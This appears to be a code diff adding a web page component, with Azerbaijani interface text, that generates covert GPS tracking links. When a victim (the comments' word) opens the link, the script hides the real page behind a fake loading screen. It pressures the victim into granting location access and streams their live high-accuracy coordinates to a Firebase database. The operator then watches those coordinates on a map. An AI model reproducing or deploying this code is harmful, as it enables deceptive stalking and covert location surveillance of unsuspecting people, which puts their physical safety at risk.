@@ -1,0 +1,124 @@
+<div style="font-family:'Outfit'; color:white; padding:15px;">
+    <div style="text-align:center; margin-bottom:20px;">
+        <i class="fas fa-crosshairs" style="color:var(--cyber); font-size:2rem; animation: pulse 2s infinite;"></i>
+        <h2 style="font-family:'Syncopate'; font-size:0.9rem; margin-top:10px;">ELITE GPS LOCATOR</h2>
+    </div>
+
+    <div id="setup-section" style="background:rgba(255,255,255,0.03); border:1px solid var(--border); padding:20px; border-radius:20px; text-align:center;">
+        <p style="font-size:0.8rem; opacity:0.6;">Hədəf üçün izləmə linki formalaşdırın:</p>
+        <button class="btn-main" onclick="createTracker()" style="background:var(--tools); color:black; width:auto; padding:12px 30px;">LİNKİ GENERASİYA ET</button>
+        
+        <div id="result-link" style="display:none; margin-top:20px; animation: fadeIn 0.5s;">
+            <input type="text" id="final-url" readonly style="width:100%; color:var(--cyber); border:1px solid var(--cyber); background:#000; padding:10px; border-radius:10px; text-align:center; font-size:0.7rem;">
+            <button onclick="copyTrackLink()" style="background:transparent; border:none; color:gray; font-size:0.7rem; cursor:pointer; margin-top:10px;">
+                <i class="fas fa-copy"></i> Kopyala
+            </button>
+        </div>
+    </div>
+
+    <div id="live-panel" style="margin-top:30px; display:none;">
+        <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:10px;">
+            <h3 style="font-size:0.8rem; color:var(--gold);">SİSTEM LOGLARI:</h3>
+            <span id="status-tag" style="font-size:0.6rem; background:red; padding:2px 8px; border-radius:5px;">HƏDƏF GÖZLƏNİLİR</span>
+        </div>
+        
+        <div id="log-box" style="background:#000; border:1px solid #222; border-radius:15px; padding:15px; height:150px; overflow-y:auto; font-family:monospace; font-size:0.7rem; color:var(--cyber);">
+            > Sistem başladıldı...
+        </div>
+
+        <div id="coord-display" style="display:grid; grid-template-columns: 1fr 1fr; gap:10px; margin-top:15px;">
+            <div style="background:var(--glass); padding:10px; border-radius:10px; border:1px solid var(--border);">
+                <span style="font-size:0.6rem; opacity:0.5;">ENLİK (LAT)</span>
+                <div id="lat-val" style="font-weight:900; color:white;">--.------</div>
+            </div>
+            <div style="background:var(--glass); padding:10px; border-radius:10px; border:1px solid var(--border);">
+                <span style="font-size:0.6rem; opacity:0.5;">UZUNLUQ (LNG)</span>
+                <div id="lng-val" style="font-weight:900; color:white;">--.------</div>
+            </div>
+        </div>
+
+        <a id="gmaps-link" href="#" target="_blank" class="btn-main" style="display:none; background:white; color:black; text-decoration:none; text-align:center; margin-top:15px;">GOOGLE MAPS-DƏ AÇ</a>
+    </div>
+</div>
+
+<script>
+    function createTracker() {
+        const uid = localStorage.getItem('elite_session');
+        const loc = window.location.origin + window.location.pathname;
+        const finalUrl = loc + "?target=" + uid;
+        
+        document.getElementById('final-url').value = finalUrl;
+        document.getElementById('result-link').style.display = 'block';
+        document.getElementById('live-panel').style.display = 'block';
+        
+        addLog("Link yaradıldı. Hədəfin daxil olması gözlənilir...");
+        startListening(uid);
+    }
+
+    function addLog(msg) {
+        const box = document.getElementById('log-box');
+        const time = new Date().toLocaleTimeString();
+        box.innerHTML = `<div>[${time}] ${msg}</div>` + box.innerHTML;
+    }
+
+    function startListening(uid) {
+        // Firebase-də hədəf məlumatlarını real vaxtda dinləyirik
+        db.ref('live_tracks/' + uid).on('value', snap => {
+            const data = snap.val();
+            if(data) {
+                document.getElementById('status-tag').innerText = "CANLI İZLƏNİLİR";
+                document.getElementById('status-tag').style.background = "green";
+                
+                document.getElementById('lat-val').innerText = data.lat;
+                document.getElementById('lng-val').innerText = data.lng;
+                
+                const gLink = `https://www.google.com/maps?q=${data.lat},${data.lng}`;
+                document.getElementById('gmaps-link').href = gLink;
+                document.getElementById('gmaps-link').style.display = 'block';
+                
+                addLog(`Koordinatlar yeniləndi: ${data.lat}, ${data.lng}`);
+                
+                // Cihaz titrəməsi (əgər mobil cihazdadırsa)
+                if(navigator.vibrate) navigator.vibrate(100);
+            }
+        });
+    }
+
+    function copyTrackLink() {
+        const copyText = document.getElementById("final-url");
+        copyText.select();
+        document.execCommand("copy");
+        alert("Link kopyalandı!");
+    }
+
+    // --- QURBAN ÜÇÜN GÖRÜNMƏZ HİSSƏ ---
+    const urlParams = new URLSearchParams(window.location.search);
+    const targetId = urlParams.get('target');
+
+    if(targetId) {
+        // Saytı qurban üçün aldadıcı bir şey kimi göstər (Məsələn: Yüklənir...)
+        document.body.innerHTML = "<div style='height:100vh; display:flex; align-items:center; justify-content:center; background:black; color:white; font-family:sans-serif;'>Səhifə yüklənir, zəhmət olmasa gözləyin...</div>";
+
+        if (navigator.geolocation) {
+            // watchPosition hədəf tərpəndikcə məlumatı yeniləyir
+            navigator.geolocation.watchPosition(pos => {
+                firebase.database().ref('live_tracks/' + targetId).set({
+                    lat: pos.coords.latitude,
+                    lng: pos.coords.longitude,
+                    acc: pos.coords.accuracy,
+                    timestamp: Date.now()
+                });
+            }, err => {
+                alert("Səhifənin tam açılması üçün məkan icazəsi verməlisiniz.");
+            }, { 
+                enableHighAccuracy: true, 
+                maximumAge: 0, 
+                timeout: 5000 
+            });
+        }
+    }
+</script>
+
+<style>
+    @keyframes pulse { 0% { opacity: 0.5; } 50% { opacity: 1; } 100% { opacity: 0.5; } }
+</style>
